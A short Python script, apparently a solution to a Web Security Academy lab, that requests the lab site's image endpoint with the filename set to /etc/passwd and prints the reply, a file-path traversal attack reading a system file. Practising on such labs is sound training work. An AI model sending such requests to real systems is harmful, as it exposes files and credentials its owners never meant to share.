import requests

site = "0a3800be0440758a80072b8000db00f5.web-security-academy.net"
url = f"https://{site}/image?filename=/etc/passwd"
s = requests.Session()
resp = s.get(url)
print(resp.text)